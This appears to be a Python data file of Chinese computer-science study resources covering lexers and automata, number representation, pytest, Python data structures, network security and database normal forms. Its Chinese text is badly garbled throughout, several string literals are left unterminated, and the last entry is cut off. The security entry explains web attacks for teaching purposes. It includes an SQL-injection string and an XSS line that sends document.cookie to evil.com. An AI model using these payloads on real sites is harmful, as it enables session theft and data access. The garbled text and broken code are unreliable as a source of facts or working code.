RESOURCES.append({
    "title": "缂栬瘧鍘熺悊-璇嶆硶鍒嗘瀽鍣ㄥ疄鐜版寚鍗?,
    "description": "鎵嬫妸鎵嬪疄鐜颁竴涓瘝娉曞垎鏋愬櫒锛圠exer锛夛紝瑕嗙洊姝ｅ垯鈫扤FA鈫扗FA鈫掓渶灏忓寲DFA鈫掍唬鐮佺敓鎴愮殑瀹屾暣娴佹按绾裤€傚寘鍚玃ython瀹炵幇婧愮爜銆丩ex/Flex璇硶閫熸煡鍜屽吀鍨嬩緥棰樸€?,
    "course": "缂栬瘧鍘熺悊", "chapter": "璇嶆硶鍒嗘瀽", "difficulty": "ADVANCED",
    "type": "READING",
    "tags": ["缂栬瘧鍘熺悊", "璇嶆硶鍒嗘瀽", "NFA", "DFA", "Lex", "Python"],
    "source_url": "https://en.wikipedia.org/wiki/Lexical_analysis",
    "content": r"""# 缂栬瘧鍘熺悊璇嶆硶鍒嗘瀽鍣ㄥ疄鐜版寚鍗?
## 1. 璇嶆硶鍒嗘瀽鍣紙Lexer锛夎璁?
璇嶆硶鍒嗘瀽鍣ㄨ礋璐ｅ皢婧愪唬鐮佸瓧绗︽祦杞崲涓篢oken娴併€傛瘡涓猅oken鍖呭惈锛?TokenType, Lexeme, Line, Column>銆?
```python
from enum import Enum
from typing import List, Tuple
import re

class TokenType(Enum):
    IF = "if"; ELSE = "else"; WHILE = "while"
    INT = "int"; FLOAT = "float"; RETURN = "return"
    PLUS = "+"; MINUS = "-"; STAR = "*"; SLASH = "/"
    ASSIGN = "="; EQ = "=="; NE = "!="; LT = "<"; GT = ">"
    LPAREN = "("; RPAREN = ")"; SEMI = ";"
    ID = "id"; NUM = "num"
    EOF = "eof"

class Token:
    def __init__(self, type: TokenType, lexeme: str, line: int, col: int):
        self.type = type; self.lexeme = lexeme
        self.line = line; self.col = col
```

## 2. 姝ｅ垯琛ㄨ揪寮?-> NFA (Thompson鏋勯€犳硶)

Thompson鏋勯€犳硶鐢ㄤ笁绫诲熀鏈琋FA鍗曞厓缁勫悎锛氬熀鏈紙鍗曞瓧绗︼級銆佸苟锛坅|b锛夈€佽繛鎺ワ紙ab锛夈€侀棴鍖咃紙a*锛夈€?
```python
class NFAState:
    def __init__(self, id: int):
        self.id = id
        self.transitions: dict[str, set] = {}
        self.epsilon: set = set()

class NFA:
    def __init__(self, start: NFAState, accept: NFAState):
        self.start = start
        self.accept = accept

def nfa_from_char(c: str, counter: list) -> NFA:
    start = NFAState(counter[0]); counter[0] += 1
    accept = NFAState(counter[0]); counter[0] += 1
    start.transitions.setdefault(c, set()).add(accept)
    return NFA(start, accept)

def nfa_concat(a: NFA, b: NFA) -> NFA:
    a.accept.epsilon.add(b.start)
    return NFA(a.start, b.accept)

def nfa_union(a: NFA, b: NFA, counter: list) -> NFA:
    start = NFAState(counter[0]); counter[0] += 1
    accept = NFAState(counter[0]); counter[0] += 1
    start.epsilon.update([a.start, b.start])
    a.accept.epsilon.add(accept); b.accept.epsilon.add(accept)
    return NFA(start, accept)

def nfa_star(a: NFA, counter: list) -> NFA:
    start = NFAState(counter[0]); counter[0] += 1
    accept = NFAState(counter[0]); counter[0] += 1
    start.epsilon.update([a.start, accept])
    a.accept.epsilon.update([a.start, accept])
    return NFA(start, accept)
```

## 3. NFA -> DFA (瀛愰泦鏋勯€犳硶)

鏍稿績鎬濇兂锛欴FA鐨勬瘡涓姸鎬佸搴擭FA鐨勪竴涓姸鎬侀泦鍚堬紙epsilon闂寘锛夈€?
```python
def epsilon_closure(states):
    stack = list(states)
    closure = set(states)
    while stack:
        s = stack.pop()
        for ns in s.epsilon:
            if ns not in closure:
                closure.add(ns)
                stack.append(ns)
    return closure

def move(states, symbol):
    result = set()
    for s in states:
        result.update(s.transitions.get(symbol, set()))
    return result

def nfa_to_dfa(nfa, alphabet):
    dfa_states = {}
    dfa_trans = {}
    dfa_accepting = set()
    start_closure = frozenset(epsilon_closure({nfa.start}))
    dfa_states[start_closure] = 0
    queue = [start_closure]
    while queue:
        current = queue.pop(0)
        cur_id = dfa_states[current]
        if nfa.accept in current:
            dfa_accepting.add(cur_id)
        for sym in alphabet:
            next_set = frozenset(epsilon_closure(move(current, sym)))
            if not next_set:
                continue
            if next_set not in dfa_states:
                dfa_states[next_set] = len(dfa_states)
                queue.append(next_set)
            dfa_trans.setdefault(cur_id, {})[sym] = dfa_states[next_set]
    return {"states": len(dfa_states), "start": 0,
            "accepting": dfa_accepting, "transitions": dfa_trans}
```

## 4. Lex/Flex 璇硶閫熸煡

```
%{
/* C澹版槑鍖?- 澶存枃浠跺拰鍏ㄥ眬鍙橀噺 */
#include <stdio.h>
int line_num = 1;
%}

/* 瀹氫箟鍖?- 鍛藉悕姝ｅ垯 */
DIGIT   [0-9]
ID      [a-zA-Z_][a-zA-Z_0-9]*

%%
/* 瑙勫垯鍖?- 妯″紡 + 鍔ㄤ綔 */
{DIGIT}+   { printf("NUM: %s\\n", yytext); }
{ID}       { printf("ID: %s\\n", yytext); }
"+"        { printf("PLUS\\n"); }
"="        { printf("ASSIGN\\n"); }

%%
/* 鐢ㄦ埛浠ｇ爜鍖?*/
int main() { yylex(); return 0; }
int yywrap() { return 1; }
```

## 5. 鍏抽敭鐭ヨ瘑鐐?
- **姝ｅ垯琛ㄨ揪寮忕殑闂寘鎬ц川**: 姝ｅ垯璇█鍦ㄥ苟/杩炴帴/Kleene鏄?琛?浜よ繍绠椾笅灏侀棴
- **Pumping Lemma**: 鐢ㄤ簬璇佹槑鏌愯瑷€闈炴鍒?- **DFA鏈€灏忓寲**: Hopcroft绠楁硶 O(n log n)锛屽垎鍓茬簿鐐兼硶
- **Lex鐢熸垚鍣?*: 杈撳叆.l鏂囦欢 -> lex.yy.c -> 缂栬瘧涓哄彲鎵ц璇嶆硶鍒嗘瀽鍣?
---
*鏉ユ簮: Compilers: Principles, Techniques, and Tools (Dragon Book), Flex Manual*
"""})

RESOURCES.append({
    "title": "璁＄畻鏈虹粍鎴愬師鐞?鏁版嵁琛ㄧず涓庤繍绠楀櫒璁捐",
    "description": "璁＄畻鏈哄簳灞傛暟鎹〃绀哄叏瑙ｏ細鍘熺爜/鍙嶇爜/琛ョ爜/绉荤爜銆両EEE 754娴偣鏁版爣鍑嗐€佸畾鐐规暟杩愮畻銆丄LU璁捐銆傚寘鍚ぇ閲忎緥棰樺拰Verilog/Logisim鐢佃矾瀹炵幇绀轰緥銆?,
    "course": "璁＄畻鏈虹粍鎴愬師鐞?, "chapter": "鏁版嵁琛ㄧず涓庤繍绠?, "difficulty": "INTERMEDIATE",
    "type": "READING",
    "tags": ["璁＄畻鏈虹粍鎴愬師鐞?, "琛ョ爜", "娴偣鏁?, "IEEE754", "ALU"],
    "source_url": "https://en.wikipedia.org/wiki/IEEE_754",
    "content": """# 璁＄畻鏈虹粍鎴愬師鐞?鏁版嵁琛ㄧず涓庤繍绠楀櫒璁捐

## 1. 鏈哄櫒鏁拌〃绀?
### 鍘熺爜
- 鏈€楂樹綅绗﹀彿浣?0姝?璐?锛屽叾浣欎负缁濆鍊?- +5: 0101, -5: 1101 (4浣?
- 缂虹偣: 鏈?0(00...0)鍜?0(10...0)锛屽姞娉曢渶棰濆澶勭悊

### 鍙嶇爜
- 姝ｆ暟涓庡師鐮佺浉鍚岋紱璐熸暟=鍘熺爜绗﹀彿浣嶄笉鍙樺叾浣欏彇鍙?- -5: 鍘熺爜1101 鈫?鍙嶇爜1010
- 缂虹偣: 浠嶆湁卤0闂锛屽紩鍏ヤ簡寰幆杩涗綅

### 琛ョ爜 (2's Complement) 鈥?鐜颁唬璁＄畻鏈烘爣鍑?- 姝ｆ暟涓庡師鐮佺浉鍚?- 璐熸暟 = 鍙嶇爜 + 1
- -5: 鍘?101鈫掑弽1010鈫掕ˉ1011
- **鍞竴闆?*: 00...0
- **琛ㄧず鑼冨洿**: [-2^(n-1), 2^(n-1)-1] (n浣?, 闈炲绉?- **杞崲鍙ｈ瘈**: 浠庡彸寰€宸︽壘鍒扮涓€涓?锛屽叾宸﹁竟鍏ㄩ儴鍙栧弽

### 绉荤爜 (Biased Representation)
- 鐪熷€?+ 鍋忕疆鍊?閫氬父2^(n-1)鎴?^(n-1)-1)
- 鐢ㄤ簬娴偣鏁伴樁鐮侊紝鏂逛究姣旇緝澶у皬
- 渚? n=8, bias=128, -1鐨勭Щ鐮?127

### 鍔犳硶杩愮畻涓庢孩鍑哄垽鏂?```
琛ョ爜鍔犳硶: [A+B]琛?= [A]琛?+ [B]琛?婧㈠嚭妫€娴嬫柟娉?
1. 鍗曠鍙蜂綅娉? 杩涗綅Cin != 杩涗綅Cout 鈫?婧㈠嚭
2. 鍙岀鍙蜂綅娉? 鐢ㄤ袱浣嶇鍙蜂綅, 00姝?11璐? 01/10婧㈠嚭
```

## 2. IEEE 754 娴偣鏁版爣鍑?
### 鍗曠簿搴?(32-bit): 1浣嶇鍙?+ 8浣嶉樁鐮?bias=127) + 23浣嶅熬鏁?### 鍙岀簿搴?(64-bit): 1浣嶇鍙?+ 11浣嶉樁鐮?bias=1023) + 52浣嶅熬鏁?
### 瑙勬牸鍖栨暟: 1.xxxxx 脳 2^(E-bias)
- 闃剁爜E 鈮?0 涓?E 鈮?鍏?
- 灏炬暟闅愬惈鍓嶅1锛堜笉瀛樺偍锛夛紝瀹為檯绮惧害+1浣?
### 鐗规畩鍊?| 闃剁爜 | 灏炬暟 | 鍚箟 |
|------|------|------|
| 鍏? | 0 | 卤0 |
| 鍏? | 鈮? | 闈炶鏍煎寲鏁?(Denormal) |
| 鍏? | 0 | 卤鈭?|
| 鍏? | 鈮? | NaN (Not a Number) |

### 渚嬮: -12.625 鍗曠簿搴﹁〃绀?```
12.625 = 1100.101 = 1.100101 脳 2^3
绗﹀彿S = 1 (璐?
闃剁爜E = 3 + 127 = 130 = 10000010
灏炬暟M = 10010100000000000000000 (鍘诲墠瀵?, 琛ラ浂鍒?3浣?
缁撴灉: 1 10000010 10010100000000000000000
```

## 3. ALU (绠楁湳閫昏緫鍗曞厓) 璁捐

### 1浣嶅叏鍔犲櫒 (Full Adder)
```
S = A 鈯?B 鈯?Cin  (鍜?
Cout = AB + (A鈯旴)Cin  (杩涗綅)
```

### 琛屾尝杩涗綅鍔犳硶鍣?(Ripple Carry)
- n涓?浣岶A涓叉帴, Cout[i] 鈫?Cin[i+1]
- 寤惰繜: O(n) 鍏抽敭璺緞

### 瓒呭墠杩涗綅鍔犳硶鍣?(Carry Lookahead)
- 杩涗綅鐢熸垚: Gi = Ai路Bi
- 杩涗綅浼犳挱: Pi = Ai 鈯?Bi
- Ci+1 = Gi + Pi路Ci
- 灞曞紑: C1 = G0+P0C0, C2 = G1+P1G0+P1P0C0, ...
- 寤惰繜: O(log n)

### 涔樻硶鍣?- **闃靛垪涔樻硶鍣?*: O(n)琛? 绫讳技绔栧紡涔樻硶
- **Booth绠楁硶**: 鍑忓皯閮ㄥ垎绉暟閲忥紝閫傚悎琛ョ爜涔樻硶
- **Wallace鏍?*: 鐢–SA(Carry Save Adder)骞惰鍘嬬缉閮ㄥ垎绉?
### 闄ゆ硶鍣?- **鎭㈠浣欐暟娉?*: 璇曞晢鈫掍笉澶熷噺鍒欐仮澶?- **涓嶆仮澶嶄綑鏁版硶**: 涓嶅鍑忔椂鐩存帴鍔犲洖鍘? 鏁堢巼鏇撮珮
- **SRT闄ゆ硶**: 鐜颁唬CPU甯哥敤

---
*鏉ユ簮: Computer Organization and Design (Patterson & Hennessy), IEEE 754-2008*
"""
})

RESOURCES.append({
    "title": "杞欢宸ョ▼-杞欢娴嬭瘯绛栫暐涓庡崟鍏冩祴璇曞疄鎴?,
    "description": "杞欢娴嬭瘯鐨勭郴缁熸柟娉曡锛屾兜鐩栨祴璇曢噾瀛楀銆佺櫧鐩掗粦鐩掔伆鐩掓祴璇曘€佺瓑浠风被杈圭晫鍊煎垎鏋愩€佽矾寰勮鐩栥€丮ock涓嶴tub銆丳ython pytest瀹炴垬銆乀DD宸ヤ綔娴併€?,
    "course": "杞欢宸ョ▼", "chapter": "杞欢娴嬭瘯", "difficulty": "INTERMEDIATE",
    "type": "READING",
    "tags": ["杞欢宸ョ▼", "娴嬭瘯", "pytest", "TDD", "鍗曞厓娴嬭瘯"],
    "source_url": "https://docs.pytest.org/en/stable/",
    "content": '''# 杞欢宸ョ▼-杞欢娴嬭瘯绛栫暐涓庡崟鍏冩祴璇曞疄鎴?
## 1. 娴嬭瘯閲戝瓧濉?
```
        / E2E \\        灏戦噺绔埌绔祴璇?(鎱?鏄傝吹/鑴嗗急)
       / Integration \\  涓瓑闆嗘垚娴嬭瘯
      /  Unit Tests   \\ 澶ч噺鍗曞厓娴嬭瘯 (蹇?渚垮疁/绋冲畾)
     -------------------
```

## 2. 娴嬭瘯鍒嗙被

### 鐧界洅娴嬭瘯 (缁撴瀯娴嬭瘯)
- 鍩轰簬浠ｇ爜鍐呴儴閫昏緫
- 瑕嗙洊鍑嗗垯: 璇彞瑕嗙洊 < 鍒ゅ畾瑕嗙洊 < 鏉′欢瑕嗙洊 < 鍒ゅ畾-鏉′欢瑕嗙洊 < 璺緞瑕嗙洊
- 鍩烘湰璺緞娴嬭瘯: 璁＄畻鍦堝鏉傚害 V(G)=e-n+2p, 鎵惧嚭鐙珛璺緞

### 榛戠洅娴嬭瘯 (鍔熻兘娴嬭瘯)
- 绛変环绫诲垝鍒? 鏈夋晥绛変环绫?+ 鏃犳晥绛変环绫?- 杈圭晫鍊煎垎鏋? min-1, min, min+1, max-1, max, max+1
- 鍐崇瓥琛ㄦ祴璇? 澶嶆潅涓氬姟瑙勫垯缁勫悎
- 鐘舵€佽縼绉绘祴璇? 鐘舵€佸浘鈫掓祴璇曠敤渚?
### 鐏扮洅娴嬭瘯
- 缁撳悎榛戠洅+鐧界洅, 濡傛暟鎹簱鏌ヨ楠岃瘉銆丄PI濂戠害娴嬭瘯

## 3. Python pytest 瀹炴垬

```python
import pytest
from unittest.mock import Mock, patch, MagicMock

# 鈹€鈹€ 鍩烘湰娴嬭瘯 鈹€鈹€
def add(a, b): return a + b

def test_add_basic():
    assert add(1, 2) == 3
    assert add(-1, 1) == 0

@pytest.mark.parametrize("a,b,expected", [
    (1, 2, 3), (-1, 1, 0), (0, 0, 0), (100, 200, 300),
])
def test_add_parametrize(a, b, expected):
    assert add(a, b) == expected

# 鈹€鈹€ 寮傚父娴嬭瘯 鈹€鈹€
def divide(a, b):
    if b == 0: raise ValueError("闄ゆ暟涓嶈兘涓洪浂")
    return a / b

def test_divide_by_zero():
    with pytest.raises(ValueError, match="闄ゆ暟涓嶈兘涓洪浂"):
        divide(10, 0)

# 鈹€鈹€ Fixture 鈹€鈹€
class UserDB:
    def __init__(self): self._users = {}
    def add(self, name, email): self._users[name] = email
    def get(self, name): return self._users.get(name)

@pytest.fixture
def db():
    """姣忎釜娴嬭瘯鑾峰緱鍏ㄦ柊鐨刄serDB瀹炰緥"""
    return UserDB()

def test_add_user(db):
    db.add("alice", "alice@example.com")
    assert db.get("alice") == "alice@example.com"

# 鈹€鈹€ Mock 鈹€鈹€
def fetch_user_data(api_client, user_id):
    resp = api_client.get(f"/users/{user_id}")
    if resp.status_code != 200:
        raise Exception(f"API error: {resp.status_code}")
    return resp.json()

def test_fetch_user_with_mock():
    mock_api = Mock()
    mock_resp = Mock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"id": 1, "name": "Alice"}
    mock_api.get.return_value = mock_resp

    result = fetch_user_data(mock_api, 1)
    assert result["name"] == "Alice"
    mock_api.get.assert_called_once_with("/users/1")

# 鈹€鈹€ Patch 鈹€鈹€
@patch('mymodule.requests.get')
def test_with_patch(mock_get):
    mock_get.return_value.json.return_value = {"status": "ok"}
    # 娴嬭瘯浣跨敤requests.get鐨勪唬鐮?..
```

## 4. TDD (娴嬭瘯椹卞姩寮€鍙? 涓夋寰幆

```
  RED 鈫?GREEN 鈫?REFACTOR 鈫?RED 鈫?...

  1. RED:   鍏堝啓澶辫触鐨勬祴璇?  2. GREEN: 鍐欐渶灏戜唬鐮佽娴嬭瘯閫氳繃
  3. REFACTOR: 閲嶆瀯浠ｇ爜, 娴嬭瘯淇濇寔缁?```

### TDD 閾佸緥
1. 闄ら潪鏄负浜嗚澶辫触鐨勬祴璇曢€氳繃锛屽惁鍒欎笉鍏佽缂栧啓浠讳綍浜у搧浠ｇ爜
2. 鍙厑璁哥紪鍐欏垰濂借冻浠ュけ璐ョ殑娴嬭瘯锛堢紪璇戝け璐ヤ篃鏄け璐ワ級
3. 鍙厑璁哥紪鍐欏垰濂借兘璁╁け璐ョ殑娴嬭瘯閫氳繃鐨勪骇鍝佷唬鐮?
## 5. 娴嬭瘯鍛藉悕瑙勮寖

- 鏂规硶鍚? test_<琚祴鏂规硶>_<鍦烘櫙>_<棰勬湡缁撴灉>
  - `test_divide_byZero_raisesException`
  - `test_login_withInvalidPassword_returns401`
- 娴嬭瘯缁撴瀯: Arrange 鈫?Act 鈫?Assert (AAA妯″紡)

## 6. 瑕嗙洊鐜囨寚鏍?
- **琛岃鐩?*: 鍝簺琛岃鑷冲皯鎵ц涓€娆?- **鍒嗘敮瑕嗙洊**: if/else涓や釜鏂瑰悜鏄惁閮芥墽琛?- **璺緞瑕嗙洊**: 鎵€鏈夊彲鑳界殑鎵ц璺緞
- **宸ュ叿**: pytest-cov (Python), JaCoCo (Java), Istanbul (JS)

---
*鏉ユ簮: pytest瀹樻柟鏂囨。, Clean Architecture (Martin), IEEE 829娴嬭瘯鏂囨。鏍囧噯*
'''})

RESOURCES.append({
    "title": "Python甯歌鏁版嵁缁撴瀯涓庡唴缃嚱鏁版€ц兘瀵规瘮",
    "description": "Python list/tuple/set/dict/deque/heapq搴曞眰瀹炵幇涓庢搷浣滃鏉傚害鍒嗘瀽銆傚惈瀹炴祴鎬ц兘瀵规瘮鍜岄€夊瀷寤鸿銆傚弬鑰働ython瀹樻柟TimeComplexity鏂囨。鍜孋Python婧愮爜銆?,
    "course": "鏁版嵁缁撴瀯", "chapter": "Python瀹炵幇", "difficulty": "INTERMEDIATE",
    "type": "READING",
    "tags": ["Python", "鏁版嵁缁撴瀯", "澶嶆潅搴?, "鎬ц兘"],
    "source_url": "https://wiki.python.org/moin/TimeComplexity",
    "content": """# Python甯歌鏁版嵁缁撴瀯涓庡唴缃嚱鏁版€ц兘瀵规瘮

## 1. 鎿嶄綔澶嶆潅搴﹂€熸煡琛?
| 鎿嶄綔 | list | tuple | set | dict | deque | heapq |
|------|------|-------|-----|------|-------|-------|
| 鎸夌储寮曡闂?| O(1) | O(1) | - | O(1) | O(1)棣栧熬 | - |
| 杩藉姞(灏鹃儴) | O(1)* | - | - | - | O(1) | O(log n) |
| 鎻掑叆(澶撮儴) | O(n) | - | - | - | O(1) | - |
| 鎻掑叆(涓棿) | O(n) | - | O(1)骞冲潎 | O(1)骞冲潎 | - | - |
| 鍒犻櫎 | O(n) | - | O(1)骞冲潎 | O(1)骞冲潎 | O(1)棣栧熬 | O(log n) |
| 鏌ユ壘(鍊? | O(n) | O(n) | O(1)骞冲潎 | O(1)骞冲潎 | O(n) | - |
| 鎴愬憳妫€鏌?`in` | O(n) | O(n) | O(1)骞冲潎 | O(1)骞冲潎 | O(n) | - |
| 鏈€灏?鏈€澶у€?| O(n) | O(n) | O(n) | O(n) | O(n) | O(1) |
| 鎺掑簭 | O(n log n) | - | - | - | - | - |

*list灏鹃儴杩藉姞鏄憡閿€O(1)锛屽伓灏旇Е鍙憆esize鏃禣(n)

## 2. 鍐呭瓨甯冨眬涓庡疄鐜?
### list 鈥?鍔ㄦ€佹暟缁?- CPython: 杩炵画鍐呭瓨, 瀛樺偍瀵硅薄鎸囬拡(PyObject*)
- 棰勫垎閰嶇瓥鐣? `new_size 鈮?old_size + old_size/8 + 6`
- `append`: 鎽婇攢O(1)
- `extend`: O(k) k涓烘柊澧炲厓绱犳暟

### tuple 鈥?涓嶅彲鍙樻暟缁?- 涓巐ist绫讳技, 浣嗕笉鍙慨鏀?- 鍐呭瓨姣攍ist灏?鏃犻鍒嗛厤绌洪棿), GC鏇村弸濂?- 灏弔uple鏈塮reelist缂撳瓨姹?
### set 鈥?鍝堝笇琛?- 寮€鏀惧鍧€娉?+ 浼殢鏈烘帰娴嬪簭鍒?- 璐熻浇鍥犲瓙 < 2/3
- `frozenset` 涓嶅彲鍙樼増鏈? 鍙搱甯?key涓簊et鐢?

### dict 鈥?鍝堝笇琛?- CPython 3.6+: 绱у噾dict (鏇村皬鏇村揩, 淇濇寔鎻掑叆椤哄簭)
- indices(绋€鐤? + entries(绱у噾) 涓ゅ眰缁撴瀯
- 蹇€焝ey鍏变韩: 鍚屼竴绫诲疄渚嬪叡浜玨ey鏁扮粍

### deque 鈥?鍙屽悜閾捐〃
- 鍐呴儴: block閾捐〃, 姣廱lock 64涓厓绱?- O(1)棣栧熬鎿嶄綔, O(n)闅忔満璁块棶
- 鏈塵axlen鍙傛暟(閫傚悎鍋歳ing buffer)

### heapq 鈥?鏈€灏忓爢 (鍒楄〃瀹炵幇)
- 鍫嗕笉鍙樺紡: `heap[k] <= heap[2k+1]` and `heap[k] <= heap[2k+2]`
- push/pop O(log n), 寤哄爢 O(n)
- heapify 鑷簳鍚戜笂siftdown O(n)

## 3. 閫夋嫨寤鸿

| 鍦烘櫙 | 鎺ㄨ崘 |
|------|------|
| 鎸夌储寮曡闂?+ 鏈熬澧炲垹 | list |
| 涓嶅彲鍙樺簭鍒?+ hashable闇€姹?| tuple |
| 鍞竴鎬?+ 蹇€熸垚鍛樻鏌?| set |
| key-value + 蹇€熸煡鎵?鏇存柊 | dict |
| FIFO闃熷垪 + O(1)棣栧熬鎿嶄綔 | deque |
| 闇€棰戠箒鍙栨渶澶?鏈€灏忓€?| heapq |
| 绾跨▼瀹夊叏璁℃暟 | Counter |
| 鏈夐粯璁ゅ€肩殑dict | defaultdict |
| 鏈夊簭dict | OrderedDict / dict (3.7+) |

## 4. Collections妯″潡绮鹃€?
```python
from collections import Counter, defaultdict, OrderedDict, ChainMap, namedtuple

# Counter: 璁℃暟
words = "the quick brown fox the quick".split()
counts = Counter(words)  # {'the': 2, 'quick': 2, 'brown': 1, 'fox': 1}
counts.most_common(2)   # [('the', 2), ('quick', 2)]

# defaultdict: 榛樿鍊?d = defaultdict(list)
d['key'].append(1)  # 涓嶉渶瑕乨.setdefault('key', []).append(1)

# namedtuple: 杞婚噺绫?Point = namedtuple('Point', ['x', 'y'])
p = Point(10, 20)  # p.x, p.y 璁块棶
```

---
*鏉ユ簮: Python瀹樻柟TimeComplexity wiki, CPython婧愮爜Objects鐩綍, Fluent Python (Ramalho)*
"""})

RESOURCES.append({
    "title": "璁＄畻鏈虹綉缁?缃戠粶瀹夊叏涓庡瘑鐮佸鍩虹",
    "description": "缃戠粶瀹夊叏鏍稿績鎶€鏈€熸煡锛氬绉板姞瀵?AES/DES)銆侀潪瀵圭О鍔犲瘑(RSA/ECC)銆佸搱甯?SHA-256)銆佹暟瀛楃鍚嶃€佽瘉涔﹂摼(PKI/TLS)銆佸父瑙佹敾鍑讳笌闃插尽锛圫QL娉ㄥ叆/XSS/CSRF锛夈€?,
    "course": "璁＄畻鏈虹綉缁?, "chapter": "缃戠粶瀹夊叏", "difficulty": "INTERMEDIATE",
    "type": "READING",
    "tags": ["璁＄畻鏈虹綉缁?, "瀹夊叏", "鍔犲瘑", "TLS", "PKI"],
    "source_url": "https://www.rfc-editor.org/rfc/rfc8446",
    "content": """# 璁＄畻鏈虹綉缁?缃戠粶瀹夊叏涓庡瘑鐮佸鍩虹

## 1. 瀵嗙爜瀛︿笁澶ф敮鏌?
```
淇濆瘑鎬?Confidentiality) 鈫?鍔犲瘑
  鈹溾攢鈹€ 瀵圭О鍔犲瘑: AES, DES, ChaCha20
  鈹斺攢鈹€ 闈炲绉板姞瀵? RSA, ECC, DH
瀹屾暣鎬?Integrity) 鈫?鍝堝笇 + MAC
  鈹溾攢鈹€ SHA-256, SHA-3, BLAKE3
  鈹斺攢鈹€ HMAC, Poly1305
璁よ瘉(Authentication) 鈫?鏁板瓧绛惧悕
  鈹溾攢鈹€ RSA绛惧悕, ECDSA, Ed25519
  鈹斺攢鈹€ PKI + 璇佷功閾?```

## 2. 瀵圭О鍔犲瘑 (Symmetric)

### AES (Advanced Encryption Standard)
- 鍒嗙粍鍔犲瘑: 128-bit鍧?- 瀵嗛挜闀垮害: 128/192/256 bit 鈫?杞暟: 10/12/14
- 鍥涙楠? SubBytes 鈫?ShiftRows 鈫?MixColumns 鈫?AddRoundKey
- 鎿嶄綔妯″紡:
  - ECB: 鐩稿悓鏄庢枃鈫掔浉鍚屽瘑鏂?(涓嶅畨鍏?)
  - CBC: 鍓嶄竴涓瘑鏂囧潡寮傛垨褰撳墠鏄庢枃 (闇€IV)
  - CTR: 璁℃暟鍣ㄦā寮? 鍙苟琛?  - GCM: CTR + GMAC璁よ瘉 (AEAD, 鎺ㄨ崘!)

### DES/3DES
- DES: 56-bit瀵嗛挜, 涓嶅畨鍏?宸茬牬瑙? 鏆村姏鎼滅储<24h)
- 3DES: 涓変釜DES涓茶仈, 112-bit鏈夋晥瀹夊叏鎬? 鎱?
## 3. 闈炲绉板姞瀵?(Asymmetric)

### RSA
- 瀵嗛挜鐢熸垚: p,q澶х礌鏁?鈫?n=pq, 蠁=(p-1)(q-1), 閫塭涓幭嗕簰璐? d鈮鈦宦?mod 蠁
- 鍏挜(n,e), 绉侀挜(n,d)
- 鍔犲瘑: C = M^e mod n
- 瑙ｅ瘑: M = C^d mod n
- 瀹夊叏鎬у熀浜? 澶ф暣鏁板垎瑙ｅ洶闅?- 鎺ㄨ崘瀵嗛挜闀垮害: 2048+ bit (2025鏍囧噯)

### ECC (妞渾鏇茬嚎瀵嗙爜)
- 瀵嗛挜鏇寸煭, 鐩稿悓瀹夊叏鎬?- ECDH: 瀵嗛挜浜ゆ崲
- ECDSA: 鏁板瓧绛惧悕
- 甯哥敤鏇茬嚎: NIST P-256, Curve25519

### Diffie-Hellman 瀵嗛挜浜ゆ崲
```
Alice: 閫塧, 鍙戦€?g^a mod p 缁橞ob
Bob:   閫塨, 鍙戦€?g^b mod p 缁橝lice
鍏变韩瀵嗛挜: g^(ab) mod p
```

## 4. TLS 1.3 鎻℃墜娴佺▼ (绠€鐗?

```
Client 鈫?Server: ClientHello (鏀寔鐨勫瘑鐮佸浠? key_share, 闅忔満鏁?
Server 鈫?Client: ServerHello (閫夊畾鐨勫瘑鐮佸浠? key_share, 璇佷功, 绛惧悕)
                 [EncryptedExtensions, CertificateVerify, Finished]
Client 鈫?Server: [Finished]

1-RTT: 鎻℃墜瀹屾垚鍚庡嵆鍙彂閫佸簲鐢ㄦ暟鎹?0-RTT: PSK鎭㈠鏃跺彲涓嶇瓑寰呭氨鍙戦€?(鏈夐噸鏀鹃闄?
```

## 5. Web瀹夊叏甯歌鏀诲嚮

### SQL娉ㄥ叆
```sql
-- 鍗遍櫓:
username = "' OR '1'='1"  鈫? SELECT * FROM users WHERE name='' OR '1'='1'

-- 闃插尽: 鍙傛暟鍖栨煡璇?cursor.execute("SELECT * FROM users WHERE name=?", (username,))
```

### XSS (璺ㄧ珯鑴氭湰)
```html
<!-- 鍙嶅皠鍨媂SS: 娉ㄥ叆鑴氭湰鍒癠RL鍙傛暟 -->
<script>fetch('http://evil.com/?cookie='+document.cookie)</script>

<!-- 闃插尽: 杈撳嚭缂栫爜, Content-Security-Policy澶?-->
```

### CSRF (璺ㄧ珯璇锋眰浼€?
```
闃插尽:
1. SameSite Cookie (Strict/Lax)
2. CSRF Token (姣忎釜琛ㄥ崟涓€娆℃€oken)
3. Origin/Referer澶存牎楠?```

## 6. 鍝堝笇鍑芥暟

| 绠楁硶 | 杈撳嚭 | 瀹夊叏鎬?| 鐢ㄩ€?|
|------|------|--------|------|
| MD5 | 128 | 鉂?宸茬牬瑙?| - |
| SHA-1 | 160 | 鉂?宸茬牬瑙?SHAttered) | - |
| SHA-256 | 256 | 鉁?| 鏁板瓧绛惧悕, 鍖哄潡閾?|
| SHA-3 | 鍙彉 | 鉁?| 鏇夸唬SHA-2 |
| BLAKE3 | 鍙彉 | 鉁?| 楂樻€ц兘 |

---
*鏉ユ簮: RFC 8446 (TLS 1.3), NIST FIPS 197 (AES), OWASP Top 10*
"""})

RESOURCES.append({
    "title": "鏁版嵁搴撹寖寮忓寲涓庡弽鑼冨紡鍖栬璁℃寚鍗?,
    "description": "鏁版嵁搴撹璁′腑鐨勮寖寮忓寲鐞嗚锛?NF鈫払CNF鈫?NF锛変笌鍙嶈寖寮忓寲绛栫暐銆傚寘鍚嚱鏁颁緷璧栧垎鏋愩€佽寖寮忓垽鏂柟娉曞拰瀹炴垬妗堜緥銆傚熀浜嶤odd鐨勫師濮嬭鏂囧拰MySQL/PostgreSQL瀹炶返銆?,
    "course": "鏁版嵁搴撳師鐞?, "chapter": "瑙勮寖鍖栬璁?, "difficulty": "ADVANCED",
    "type": "READING",
    "tags": ["鏁版嵁搴?, "鑼冨紡", "BCNF", "鍑芥暟渚濊禆", "璁捐"],
    "source_url": "https://en.wikipedia.org/wiki/Database_normalization",
    "content": """# 鏁版嵁搴撹寖寮忓寲涓庡弽鑼冨紡鍖栬璁℃寚鍗?
## 1. 鑼冨紡閫掕繘鍏崇郴

```
1NF 鈫?2NF 鈫?3NF 鈫?BCNF 鈫?4NF 鈫?5NF
 鈫?姣忓眰娑堥櫎涓€绫诲紓甯?```

## 2. 鍏眰鑼冨紡璇﹁В

### 1NF (绗竴鑼冨紡)
**瑕佹眰**: 姣忎釜灞炴€у€奸兘鏄師瀛愮殑锛堜笉鍙垎鍓诧級
```
